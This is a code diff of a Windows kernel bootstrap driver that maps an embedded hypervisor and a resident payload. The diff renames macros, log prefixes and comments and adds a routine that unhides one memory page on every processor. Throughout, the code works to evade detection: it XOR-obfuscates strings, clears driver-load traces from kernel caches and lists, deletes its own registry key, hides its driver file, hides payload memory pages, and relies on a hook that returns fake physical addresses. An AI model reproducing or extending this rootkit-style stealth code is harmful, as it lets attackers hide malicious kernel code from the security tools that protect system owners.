@@ -12,7 +12,7 @@
 #include "common/machenike_payload.h"
 #include "fake/filer.h"
 #include "poolmanager/PoolManager.h"
-#if MAPDRIVER_DRIVER_FILE_HIDE_ENABLED
+#if VT_DRIVER_FILE_HIDE_ENABLED
 #include "fake/hr.h"
 #endif
 #include "trace/trace.hpp"
@@ -46,6 +46,7 @@ static volatile LONG g_payload_image_unpack_kind = MAPDRIVER_UNPACK_BUFFER_NONE;
 static volatile LONG g_machenike_unpack_kind = MAPDRIVER_UNPACK_BUFFER_NONE;
 
 static volatile LONG g_payload_detached = 0;
+static volatile LONG g_bootstrap_lightweight_unload_armed = 0;
 static PDRIVER_OBJECT g_host_driver_object = nullptr;
 static PDEVICE_OBJECT g_control_device = nullptr;
 static UNICODE_STRING g_control_symlink = {};
@@ -121,18 +122,15 @@ static void mapdriver_cache_testdriver_boot_flags_ptr(const mapctl_hv_diag& diag
 
     if (g_testdriver_boot_flags_ptr != ptr)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] cached TestDriver boot flags ptr=%p\n"), (PVOID)ptr);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] cached VtHypervisor boot flags ptr=%p\n"), (PVOID)ptr);
         g_testdriver_boot_flags_ptr = ptr;
     }
 }
 
 static void mapdriver_normalize_hv_diag(mapctl_hv_diag& diag)
 {
-    // New TestDriver fills ghv_size directly.  For older/intermediate VT
-    // builds that already moved ghv/vt_hook_table into the resident arena but
-    // forgot the tail ghv_size field, infer the resident ghv allocation from
-    // the next carved block.  User evidence:
-    //   ghv=...FFA00000, vt_hook=...01120000 => delta 0x1720000.
+    // 新版直接填充 ghv_size。对于已将 ghv/vt_hook_table 移入常驻 Arena 内存、
+    // 但缺少末尾 ghv_size 字段的历史构建版本，通过下一个划分块的基址推算常驻 ghv 的分配尺寸。
     if (!diag.ghv_size &&
         diag.ghv &&
         diag.vt_hook_table_ptr > diag.ghv)
@@ -204,11 +202,11 @@ static PRTL_DECOMPRESS_BUFFER mapdriver_resolve_decompress()
 
 static PUCHAR mapdriver_alloc_scratch_buffer(ULONG size)
 {
-#if MAPDRIVER_FORCE_EXALLOCPOOL
+#if VT_MEM_FORCE_EXALLOCPOOL
     if (!size)
         return nullptr;
 
-    PUCHAR buffer = (PUCHAR)ExAllocatePoolWithTag(MAPDRIVER_FORCE_EXALLOCPOOL_TYPE, size, MEM_TAG);
+    PUCHAR buffer = (PUCHAR)ExAllocatePoolWithTag(VT_MEM_FORCE_EXALLOCPOOL_TYPE, size, MEM_TAG);
     if (!buffer)
         return nullptr;
 
@@ -254,7 +252,7 @@ static PUCHAR mapdriver_alloc_unpack_buffer(ULONG size, ULONG* kind_out)
     if (!size)
         return nullptr;
 
-#if !MAPDRIVER_FORCE_EXALLOCPOOL
+#if !VT_MEM_FORCE_EXALLOCPOOL
     if (MmAllocateIndependentPages && MmFreeIndependentPages && MmSetPageProtection)
     {
         PUCHAR buffer = (PUCHAR)MmAllocateIndependentPages(size, MAXULONG64);
@@ -272,10 +270,10 @@ static PUCHAR mapdriver_alloc_unpack_buffer(ULONG size, ULONG* kind_out)
         }
     }
 
-    // Physical-machine policy: no ExAllocatePool fallback for unpack buffers.
+    // 实机运行策略：解压缓冲区严禁回退使用 ExAllocatePool 分配池。
     return nullptr;
 #else
-    PUCHAR buffer = (PUCHAR)ExAllocatePoolWithTag(MAPDRIVER_FORCE_EXALLOCPOOL_TYPE, size, MEM_TAG);
+    PUCHAR buffer = (PUCHAR)ExAllocatePoolWithTag(VT_MEM_FORCE_EXALLOCPOOL_TYPE, size, MEM_TAG);
     if (!buffer)
         return nullptr;
 
@@ -349,7 +347,7 @@ static void mapdriver_free_scratch_buffer(PUCHAR buffer, ULONG size)
         return;
 
     RtlSecureZeroMemory(buffer, size);
-#if MAPDRIVER_FORCE_EXALLOCPOOL
+#if VT_MEM_FORCE_EXALLOCPOOL
     ExFreePoolWithTag(buffer, MEM_TAG);
 #else
     if (MmFreeIndependentPages)
@@ -359,21 +357,21 @@ static void mapdriver_free_scratch_buffer(PUCHAR buffer, ULONG size)
 
 static bool mapdriver_ensure_payload_arena()
 {
-#if MAPDRIVER_PAYLOAD_ARENA_SIZE
+#if VT_PAYLOAD_ARENA_SIZE
     if (Utils::payloadArenaBase && Utils::payloadArenaSize)
         return true;
 
-    Utils::payloadArenaBase = mapdriver_alloc_scratch_buffer(MAPDRIVER_PAYLOAD_ARENA_SIZE);
-    Utils::payloadArenaSize = Utils::payloadArenaBase ? MAPDRIVER_PAYLOAD_ARENA_SIZE : 0;
+    Utils::payloadArenaBase = mapdriver_alloc_scratch_buffer(VT_PAYLOAD_ARENA_SIZE);
+    Utils::payloadArenaSize = Utils::payloadArenaBase ? VT_PAYLOAD_ARENA_SIZE : 0;
     if (!Utils::payloadArenaBase || !Utils::payloadArenaSize)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] resident arena alloc failed size=0x%X\n"),
-            (ULONG)MAPDRIVER_PAYLOAD_ARENA_SIZE);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] resident arena alloc failed size=0x%X\n"),
+            (ULONG)VT_PAYLOAD_ARENA_SIZE);
         return false;
     }
 
     g_yvt_state_arena_used = 0;
-    LOG_DEBUG(_XOR_("[mapDriver] resident arena ready base=%p size=0x%X\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] resident arena ready base=%p size=0x%X\n"),
         Utils::payloadArenaBase, Utils::payloadArenaSize);
     return true;
 #else
@@ -406,13 +404,10 @@ static payload_u64 mapdriver_get_resident_hv_diag(mapctl_hv_diag* out)
             return copied;
     }
 
-    // Some VM-exit paths cannot translate the caller's kernel stack VA with
-    // the current guest CR3/KVA-shadow view.  A subtler variant can fill only
-    // the first part of a stack-local mapctl_hv_diag when the struct crosses a
-    // physical page boundary: the base magic/rip/rsp fields look valid, but
-    // later migration-critical fields such as vt_hook_table_ptr/ghv_size stay
-    // zero.  Retry from a single page-owned scratch buffer so the full 0x630
-    // diagnostic record lives in one translated page before legacy detach.
+    // 部分 VM-exit 路径在当前 Guest CR3/KVA-shadow 视角下无法直接转换调用方的内核栈虚拟地址。
+    // 更隐蔽的情况是：当栈上局部的 mapctl_hv_diag 跨越物理页边界时，只能填充结构体前半部分，
+    // 导致关键字段（如 vt_hook_table_ptr/ghv_size）保持为 0。此处使用单页私有临时缓冲区重试，
+    // 确保完整的 0x630 诊断记录在脱离前全部驻留在单个已转换的物理页中。
     PUCHAR scratch = mapdriver_alloc_scratch_buffer(PAGE_SIZE);
     if (!scratch)
         return copied;
@@ -453,10 +448,9 @@ static bool mapdriver_unpack_test_sys(PUCHAR* out_buffer, ULONG* out_size)
     *out_buffer = nullptr;
     *out_size = 0;
 
-    // This identity is generated from the exact VtHypervisor.sys that was
-    // embedded.  It makes stale Bootstrap/inner-HV mismatches visible in the
-    // kernel log before any SVM state is changed.
-    LOG_DEBUG(_XOR_("[mapDriver] TestDriver embedded identity sha256=%s unpacked=0x%X packed=0x%X\n"),
+    // 该特征由内嵌的 VtHypervisor.sys 二进制生成。
+    // 在修改任何硬件状态之前，使引导驱动与内部 Hypervisor 版本不匹配的隐患在内核日志中立即可见。
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor embedded identity sha256=%s unpacked=0x%X packed=0x%X\n"),
         HYPERVISOR_PAYLOAD_SHA256,
         HYPERVISOR_PAYLOAD_UNPACKED_SIZE,
         HYPERVISOR_PAYLOAD_PACKED_SIZE);
@@ -468,7 +462,7 @@ static bool mapdriver_unpack_test_sys(PUCHAR* out_buffer, ULONG* out_size)
     PUCHAR plain = mapdriver_alloc_unpack_buffer(HYPERVISOR_PAYLOAD_UNPACKED_SIZE, &alloc_kind);
     if (!plain)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack alloc failed size=0x%X indep=%p free=%p prot=%p\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor unpack alloc failed size=0x%X indep=%p free=%p prot=%p\n"),
             HYPERVISOR_PAYLOAD_UNPACKED_SIZE, MmAllocateIndependentPages, MmFreeIndependentPages, MmSetPageProtection);
         return false;
     }
@@ -476,7 +470,7 @@ static bool mapdriver_unpack_test_sys(PUCHAR* out_buffer, ULONG* out_size)
     auto decompress = mapdriver_resolve_decompress();
     if (!decompress)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack decompress missing alloc=%u size=0x%X packed=0x%X\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor unpack decompress missing alloc=%u size=0x%X packed=0x%X\n"),
             alloc_kind, HYPERVISOR_PAYLOAD_UNPACKED_SIZE, (ULONG)sizeof(test_sys));
         mapdriver_free_unpack_buffer(plain, HYPERVISOR_PAYLOAD_UNPACKED_SIZE, alloc_kind);
         return false;
@@ -494,7 +488,7 @@ static bool mapdriver_unpack_test_sys(PUCHAR* out_buffer, ULONG* out_size)
         &final_size,
         &exception_code);
 
-    LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X decompress=%p exc=0x%X\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X decompress=%p exc=0x%X\n"),
         alloc_kind,
         status,
         final_size,
@@ -542,7 +536,7 @@ static bool mapdriver_unpack_payload_image(PUCHAR* out_buffer, ULONG* out_size)
     *out_buffer = nullptr;
     *out_size = 0;
 
-    LOG_DEBUG(_XOR_("[mapDriver] ResidentPayload embedded identity sha256=%s source_pe_size=0x%X unpacked=0x%X packed=0x%X\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] ResidentPayload embedded identity sha256=%s source_pe_size=0x%X unpacked=0x%X packed=0x%X\n"),
         PAYLOAD_IMAGE_SOURCE_PE_SHA256,
         PAYLOAD_IMAGE_SOURCE_PE_SIZE,
         PAYLOAD_IMAGE_UNPACKED_SIZE,
@@ -555,7 +549,7 @@ static bool mapdriver_unpack_payload_image(PUCHAR* out_buffer, ULONG* out_size)
     PUCHAR plain = mapdriver_alloc_unpack_buffer(PAYLOAD_IMAGE_UNPACKED_SIZE, &alloc_kind);
     if (!plain)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] payload image unpack alloc failed size=0x%X indep=%p free=%p prot=%p\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] payload image unpack alloc failed size=0x%X indep=%p free=%p prot=%p\n"),
             PAYLOAD_IMAGE_UNPACKED_SIZE, MmAllocateIndependentPages, MmFreeIndependentPages, MmSetPageProtection);
         return false;
     }
@@ -563,7 +557,7 @@ static bool mapdriver_unpack_payload_image(PUCHAR* out_buffer, ULONG* out_size)
     auto decompress = mapdriver_resolve_decompress();
     if (!decompress)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] payload image unpack decompress missing alloc=%u size=0x%X packed=0x%X\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] payload image unpack decompress missing alloc=%u size=0x%X packed=0x%X\n"),
             alloc_kind, PAYLOAD_IMAGE_UNPACKED_SIZE, (ULONG)sizeof(payload_image_blob));
         mapdriver_free_unpack_buffer(plain, PAYLOAD_IMAGE_UNPACKED_SIZE, alloc_kind);
         return false;
@@ -580,7 +574,7 @@ static bool mapdriver_unpack_payload_image(PUCHAR* out_buffer, ULONG* out_size)
         (ULONG)sizeof(payload_image_blob),
         &final_size,
         &exception_code);
-    LOG_DEBUG(_XOR_("[mapDriver] payload image unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X decompress=%p exc=0x%X\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] payload image unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X decompress=%p exc=0x%X\n"),
         alloc_kind,
         status,
         final_size,
@@ -638,7 +632,7 @@ static bool mapdriver_unpack_machenike_sys(PUCHAR* out_buffer, ULONG* out_size)
     *out_buffer = nullptr;
     *out_size = 0;
 
-    LOG_DEBUG(_XOR_("[mapDriver] Machenike embedded identity sha256=%s unpacked=0x%X packed=0x%X\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike embedded identity sha256=%s unpacked=0x%X packed=0x%X\n"),
         MACHENIKE_SYS_SHA256,
         MACHENIKE_SYS_UNPACKED_SIZE,
         MACHENIKE_SYS_PACKED_SIZE);
@@ -650,7 +644,7 @@ static bool mapdriver_unpack_machenike_sys(PUCHAR* out_buffer, ULONG* out_size)
     PUCHAR plain = mapdriver_alloc_unpack_buffer(MACHENIKE_SYS_UNPACKED_SIZE, &alloc_kind);
     if (!plain)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] Machenike unpack alloc failed size=0x%X\n"), MACHENIKE_SYS_UNPACKED_SIZE);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike unpack alloc failed size=0x%X\n"), MACHENIKE_SYS_UNPACKED_SIZE);
         return false;
     }
 
@@ -673,7 +667,7 @@ static bool mapdriver_unpack_machenike_sys(PUCHAR* out_buffer, ULONG* out_size)
         &final_size,
         &exception_code);
 
-    LOG_DEBUG(_XOR_("[mapDriver] Machenike unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X exc=0x%X\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike unpack diag alloc=%u status=0x%X final=0x%X expect=0x%X packed=0x%X head=%02X %02X exc=0x%X\n"),
         alloc_kind, status, final_size, MACHENIKE_SYS_UNPACKED_SIZE, (ULONG)sizeof(machenike_sys),
         plain[0], plain[1], exception_code);
 
@@ -821,7 +815,7 @@ static void mapdriver_prepare_unload_trace_handoff(payload_boot_context* ctx)
     ctx->trace_hash_interval_exits = 4096;
     ctx->trace_hash_max_attempts = 512;
 
-    LOG_DEBUG(_XOR_("[mapDriver] trace handoff name=%ws bytes=0x%llX mmunld=0x%llX last=0x%llX hash=0x%llX lock=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] trace handoff name=%ws bytes=0x%llX mmunld=0x%llX last=0x%llX hash=0x%llX lock=0x%llX\n"),
         g_trace_driver_name,
         ctx->trace_unload_name_bytes,
         ctx->trace_unload_mm_unloaded_drivers,
@@ -832,7 +826,7 @@ static void mapdriver_prepare_unload_trace_handoff(payload_boot_context* ctx)
 
 static void mapdriver_clear_traces(PCWSTR driver_name, bool include_filter_runtime)
 {
-#if MAPDRIVER_TRACE_CLEAN_ENABLED
+#if VT_TRACE_CLEAN_ENABLED
     if (!driver_name || !driver_name[0])
         return;
 
@@ -840,7 +834,7 @@ static void mapdriver_clear_traces(PCWSTR driver_name, bool include_filter_runti
     bool piddb_ok = trace::clear_cache(driver_name, kTraceDriverStamp);
     bool unload_ok = trace::clear_unloaded_driver(driver_name);
     bool hash_ok = trace::clear_hash_bucket_list(driver_name);
-    LOG_DEBUG(_XOR_("[mapDriver] trace clean name=%ws stamp=0x%X piddb=%d unld=%d hash=%d filter=%d\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] trace clean name=%ws stamp=0x%X piddb=%d unld=%d hash=%d filter=%d\n"),
         driver_name,
         kTraceDriverStamp,
         (int)piddb_ok,
@@ -858,7 +852,7 @@ static void mapdriver_clear_traces(PCWSTR driver_name, bool include_filter_runti
 
 static bool mapdriver_delete_registry_key(PUNICODE_STRING registry_path)
 {
-#if MAPDRIVER_REGISTRY_DELETE_ENABLED
+#if VT_REGISTRY_DELETE_ENABLED
     if (!registry_path)
         return false;
 
@@ -884,7 +878,7 @@ static bool mapdriver_delete_registry_key(PUNICODE_STRING registry_path)
 #endif
 }
 
-#if MAPDRIVER_DRIVER_FILE_HIDE_ENABLED
+#if VT_DRIVER_FILE_HIDE_ENABLED
 static void mapdriver_hide_driver_file(PDRIVER_OBJECT driver_object)
 {
     if (!driver_object)
@@ -923,9 +917,8 @@ static VOID mapdriver_hv_probe_callout(PVOID parameter)
 
 static bool mapdriver_hv_ready()
 {
-    // An absent hypervisor turns VMCALL/VMMCALL into #UD.  Run the guarded
-    // probe on an expanded stack so exception dispatch cannot exhaust a
-    // DriverEntry worker stack that has already traversed trace cleanup.
+    // 若 Hypervisor 不存在，VMCALL/VMMCALL 将引发 #UD 异常。
+    // 在扩容后的独立栈上执行带异常保护的探测，防止异常分发耗尽已完成痕迹清理的 DriverEntry 线程栈。
     if (KeGetCurrentIrql() > APC_LEVEL)
         return false;
 
@@ -1033,7 +1026,7 @@ static bool mapdriver_load_testdriver(PUCHAR image)
     boot.mm_free_independent_pages = (payload_u64)MmFreeIndependentPages;
     boot.mm_set_page_protection = (payload_u64)MmSetPageProtection;
     boot.flags |= YVT_BOOT_FLAG_KEEP_HV_ON_UNLOAD;
-#if MAPDRIVER_PAYLOAD_ARENA_SIZE
+#if VT_PAYLOAD_ARENA_SIZE
     if (mapdriver_ensure_payload_arena())
     {
         boot.flags |= YVT_BOOT_FLAG_EXTERNAL_STATE;
@@ -1054,7 +1047,7 @@ static bool mapdriver_load_testdriver(PUCHAR image)
     mapdriver_bootstrap_watchdog_disarm();
 
     g_yvt_state_arena_used = boot.state_arena_used;
-    LOG_DEBUG(_XOR_("[mapDriver] TestDriver boot flags=0x%llX boot_status=0x%llX state=0x%llX/0x%llX used=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor boot flags=0x%llX boot_status=0x%llX state=0x%llX/0x%llX used=0x%llX\n"),
         boot.flags, boot.status, boot.state_arena, boot.state_arena_size, boot.state_arena_used);
     return NT_SUCCESS(status) && ctx.ok;
 }
@@ -1064,11 +1057,11 @@ static void mapdriver_save_testdriver_image_base()
     if (!Utils::imageBase || !mapdriver_hv_ready())
         return;
 
-    // Only publish the mapped image base.
+    // 仅发布映射后的映像基址。
     hv::vmcall_save_image_base((UINT64)Utils::imageBase, 0);
 }
 
-#if 0 || 0 || MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if 0 || 0 || VT_HIDE_PAYLOAD_ENABLED
 static bool mapdriver_section_name_is(const char* name, char c0, char c1, char c2, char c3, char c4, char c5)
 {
     return name &&
@@ -1082,7 +1075,7 @@ static bool mapdriver_section_name_is(const char* name, char c0, char c1, char c
 
 static bool mapdriver_keep_section_visible(const Utils::SectionSnap& section)
 {
-    // Keep .pdata visible for unwind/stackwalk stability.
+    // 保持 .pdata 节可见，确保栈展开（Stack Unwind）与栈遍历稳定性。
     return mapdriver_section_name_is(section.name, '.', 'p', 'd', 'a', 't', 'a');
 }
 
@@ -1098,12 +1091,12 @@ static UINT64 mapdriver_page_up(UINT64 value)
 
 static UINT64 mapdriver_testdriver_tail_visible_begin()
 {
-    if (!Utils::imageBase || !Utils::imageSize || !MAPDRIVER_LEGACY_HYPERVISOR_TAIL_VISIBLE_PAGES)
+    if (!Utils::imageBase || !Utils::imageSize || !VT_LEGACY_HYPERVISOR_TAIL_VISIBLE_PAGES)
         return 0;
 
     UINT64 image_base = (UINT64)Utils::imageBase;
     UINT64 image_end = mapdriver_page_up(image_base + Utils::imageSize);
-    UINT64 tail_bytes = (UINT64)MAPDRIVER_LEGACY_HYPERVISOR_TAIL_VISIBLE_PAGES * PAGE_SIZE;
+    UINT64 tail_bytes = (UINT64)VT_LEGACY_HYPERVISOR_TAIL_VISIBLE_PAGES * PAGE_SIZE;
 
     if (Utils::imageSize <= tail_bytes)
         return image_base;
@@ -1118,16 +1111,14 @@ static bool mapdriver_testdriver_tail_visible_page(UINT64 va)
 }
 #endif
 
-#if 0 || MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if 0 || VT_HIDE_PAYLOAD_ENABLED
 static UINT64 mapdriver_real_pa_for_kernel_va(UINT64 va)
 {
     UINT64 pa = 0;
 
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
-    // Once the payload's MmGetPhysicalAddress hook is installed, direct
-    // MmGetPhysicalAddress(protected_va) intentionally returns a fake PA.
-    // PFN hide/unhide bookkeeping still needs the real page-table PA, so use
-    // the VT translation hypercall first.
+#if VT_HIDE_PAYLOAD_ENABLED
+    // 一旦常驻载荷的 MmGetPhysicalAddress 钩子生效，直接调用 MmGetPhysicalAddress(受保护VA) 将故意返回伪造的物理地址。
+    // PFN 隐藏/显现账本仍需要真实的页表物理地址，因此优先使用 VT 地址转换超调用。
     if (mapdriver_hv_ready())
     {
         __try
@@ -1223,11 +1214,9 @@ static payload_u64 mapdriver_snapshot_resident_pool_blocks(
     }
 
     //
-    // The resident manifest lives in payload-owned memory.  After the payload
-    // image is hidden, guest-mode dereference of status.resident_pool_manifest
-    // sees the dummy PFN and returns zero records.  Always prefer the resident
-    // root-mode GET_POOL_BLOCKS hypercall: it reads the manifest with host
-    // accesses and copies a visible snapshot into this mapDriver buffer.
+    // 常驻清单驻留在载荷私有内存中。载荷映像隐藏后，Guest 模式解引用 status.resident_pool_manifest
+    // 将看到伪造的空白 PFN 并返回 0 条记录。必须优先调用常驻 Root-mode 的 GET_POOL_BLOCKS 超调用：
+    // 它通过 Host 权限读取清单，并将可见快照复制回本缓冲区块中。
     //
     payload_u64 count = 0;
     if (mapdriver_hv_ready())
@@ -1251,8 +1240,8 @@ static payload_u64 mapdriver_snapshot_resident_pool_blocks(
     if (count > max_blocks)
         count = max_blocks;
 
-    // Fallback for early/legacy phases before the bridge owns GET_POOL_BLOCKS.
-    // This only works while the manifest page is still guest-visible.
+    // 在桥接器接管 GET_POOL_BLOCKS 之前的早期阶段回退方案。
+    // 仅在清单页面对 Guest 依然可见时有效。
     if (!count && expected && manifest)
     {
         auto src = (const payload_pool_block*)manifest;
@@ -1448,10 +1437,8 @@ static bool mapdriver_query_payload_status(payload_status* out)
 
     RtlZeroMemory(out, sizeof(*out));
 
-    // After resident handoff the long-term control path must not execute the
-    // guest-visible payload image via payload_exports->get_status.  Query the
-    // status from root mode through the payload bridge instead; this keeps
-    // status usable once payload image/direct pages are hidden from the guest.
+    // 常驻交接完成后，长期控制链路严禁通过 payload_exports->get_status 在 Guest 模式执行载荷代码。
+    // 必须转由常驻桥接器在 Root-mode 下查询状态；确保载荷映像/跳板页对 Guest 隐藏后状态查询依然可用。
     if (g_payload_detached && mapdriver_hv_ready())
     {
         __try
@@ -1569,7 +1556,7 @@ static bool mapdriver_vmcall_map_host_range_logged(payload_u64 base,
         ok = false;
     }
 
-    LOG_DEBUG(_XOR_("[mapDriver] hostmap %s %s base=0x%llX size=0x%llX ok=%d required=%d\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] hostmap %s %s base=0x%llX size=0x%llX ok=%d required=%d\n"),
         phase ? phase : "?",
         name ? name : "?",
         base,
@@ -1582,10 +1569,8 @@ static bool mapdriver_vmcall_map_host_range_logged(payload_u64 base,
 
 static bool mapdriver_payload_pool_tag_has_code(unsigned int tag)
 {
-    // Adopted TestDriver PoolManager tag for trampoline executable pages.
-    // These pages are later used by hook/EPT trampoline paths and therefore
-    // must have a private HOST_CR3 mapping before the guest-visible PFN/PTE
-    // view is altered.
+    // 适配 PoolManager 中用于跳板可执行页的标签。
+    // 这些页面后续供钩子与 EPT 跳板使用，因此在修改 Guest 视角的 PFN/PTE 映射前，必须先在 HOST_CR3 建立私有映射。
     return tag == 'tram';
 }
 
@@ -1632,7 +1617,7 @@ static bool mapdriver_payload_pool_block_in_known_hostmap(const payload_status& 
 static bool mapdriver_map_payload_host_pool_blocks(const payload_status& ps,
                                                    const char* phase)
 {
-#if MAPDRIVER_PAYLOAD_HOSTMAP_CODE_POOLS || MAPDRIVER_PAYLOAD_HOSTMAP_ALL_POOLS
+#if VT_HOSTMAP_CODE_POOLS_ONLY || VT_HOSTMAP_ALL_POOLS
     if (!ps.resident_pool_manifest || !ps.resident_pool_count)
     {
         LOG_DEBUG(_XOR_("[payload] hostmap pool skipped %s: manifest=0x%llX count=%llu\n"),
@@ -1693,7 +1678,7 @@ static bool mapdriver_map_payload_host_pool_blocks(const payload_status& ps,
                 continue;
             }
 
-#if !MAPDRIVER_PAYLOAD_HOSTMAP_ALL_POOLS
+#if !VT_HOSTMAP_ALL_POOLS
             if (!mapdriver_payload_pool_tag_has_code(b.tag))
             {
                 skipped_noncode++;
@@ -1738,7 +1723,7 @@ static bool mapdriver_map_payload_host_pool_blocks(const payload_status& ps,
         skipped_known,
         skipped_noncode,
         bytes,
-        (MAPDRIVER_PAYLOAD_HOSTMAP_ALL_POOLS ? "all" : "code")
+        (VT_HOSTMAP_ALL_POOLS ? "all" : "code")
     );
 
     RtlSecureZeroMemory(blocks, sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks);
@@ -1759,10 +1744,10 @@ static bool mapdriver_map_payload_host_resident_ranges(const payload_status& ps,
 
     bool ok = true;
 
-    // Root-mode payload bridge and MM hook handlers can execute/read all of
+    // Root-模式 payload bridge and MM hook handlers can 执行/读取 all of
     // these ranges after VMCS_HOST_RIP is switched.  Mapping only image/stack
-    // leaves direct state descriptors or migrated legacy ghv/vt tables (arena)
-    // dependent on System CR3 and can #PF/triple-fault under VT host CR3.
+    // leaves direct 状态 descriptors or migrated legacy ghv/vt tables (arena)
+    // dependent on System CR3 and can #PF/triple-fault under VT Host CR3 寄存器.
     ok = mapdriver_vmcall_map_host_range_logged(
         ps.image_base,
         ps.image_size,
@@ -1845,7 +1830,7 @@ static ULONG mapdriver_hide_range_pfns_chunked(UINT64 base, UINT64 size);
 
 static void mapdriver_hide_payload_memory(const char* phase)
 {
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     payload_status status = {};
     if (!mapdriver_query_payload_status(&status) || !mapdriver_payload_barrier_ready(&status))
     {
@@ -1860,13 +1845,13 @@ static void mapdriver_hide_payload_memory(const char* phase)
     }
 
     ULONG pfn_count = 0;
-#if MAPDRIVER_PAYLOAD_HIDE_IMAGE_ENABLED
+#if VT_HIDE_PAYLOAD_IMAGE
     pfn_count += mapdriver_hide_range_pfns_chunked(status.image_base, status.image_size);
 #endif
-#if MAPDRIVER_PAYLOAD_HIDE_ARENA_ENABLED
+#if VT_HIDE_PAYLOAD_ARENA
     pfn_count += mapdriver_hide_range_pfns_chunked(status.arena_base, status.arena_size);
 #endif
-#if MAPDRIVER_PAYLOAD_HIDE_DIRECT_ENABLED
+#if VT_HIDE_PAYLOAD_DIRECT
     pfn_count += mapdriver_hide_range_pfns_chunked(status.direct_alloc_base, status.direct_alloc_size);
 #endif
 
@@ -1886,7 +1871,7 @@ static void mapdriver_hide_payload_memory(const char* phase)
 
 static void mapdriver_hide_payload_arena_used(const char* phase)
 {
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     payload_status status = {};
     if (!mapdriver_query_payload_status(&status) ||
         !mapdriver_payload_barrier_ready(&status) ||
@@ -1923,7 +1908,7 @@ static void mapdriver_hide_payload_arena_used(const char* phase)
 
 static void mapdriver_hide_pfn_buffer_all_cpus(UINT64* pfns, ULONG pfn_count)
 {
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     if (!pfns || !pfn_count)
         return;
 
@@ -1949,12 +1934,82 @@ static void mapdriver_hide_pfn_buffer_all_cpus(UINT64* pfns, ULONG pfn_count)
 #endif
 }
 
+// HANDOFF_DROPCTL 删除控制设备后，Guest 侧只会进入 ResidentPayload 的
+// release_bootstrap 叶函数。这里只显现该入口所在的一页，避免为了一个空叶函数
+// 先对 image/arena/pool 的数万 PFN 执行全量 unhide，再立即隐藏其中的大部分页面。
+// 每个活动处理器都必须确认更新成功；部分成功时保持原 DriverUnload，不进入交接。
+static bool mapdriver_unhide_resident_release_page(UINT64 release_entry, const char* phase)
+{
+#if VT_HIDE_PAYLOAD_ENABLED
+    if (!release_entry || !mapdriver_hv_ready())
+        return false;
+
+    UINT64 const page = mapdriver_page_down(release_entry);
+    UINT64 const pa = mapdriver_real_pa_for_kernel_va(page);
+    if (!pa)
+    {
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] release page unhide %s failed: entry=%p pa=0\n"),
+            phase, (PVOID)release_entry);
+        return false;
+    }
+
+    UINT64 pfn = pa >> PAGE_SHIFT;
+    ULONG cpu_count = 0;
+    ULONG done_count = 0;
+    USHORT const group_count = KeQueryActiveGroupCount();
+
+    for (USHORT group = 0; group < group_count; ++group)
+    {
+        ULONG const processors = KeQueryActiveProcessorCountEx(group);
+        for (ULONG cpu = 0; cpu < processors && cpu < 64; ++cpu)
+        {
+            GROUP_AFFINITY affinity = {};
+            affinity.Group = group;
+            affinity.Mask = 1ull << cpu;
+
+            GROUP_AFFINITY previous = {};
+            KeSetSystemGroupAffinityThread(&affinity, &previous);
+
+            payload_u64 done = 0;
+            __try
+            {
+                done = hv::vmcall_unhide_pfn_list(&pfn, 1);
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER)
+            {
+                done = 0;
+            }
+
+            KeRevertToUserGroupAffinityThread(&previous);
+            cpu_count++;
+            if (done == 1)
+                done_count++;
+        }
+    }
+
+    bool const ok = cpu_count != 0 && done_count == cpu_count;
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] release page unhide %s entry=%p page=%p pfn=0x%llX cpus=%lu/%lu ok=%d\n"),
+        phase,
+        (PVOID)release_entry,
+        (PVOID)page,
+        pfn,
+        done_count,
+        cpu_count,
+        (int)ok);
+    return ok;
+#else
+    UNREFERENCED_PARAMETER(release_entry);
+    UNREFERENCED_PARAMETER(phase);
+    return true;
+#endif
+}
+
 static volatile LONG g_hide_pfn_busy = 0;
 static UINT64 g_hide_pfn_buffer[1024];
 
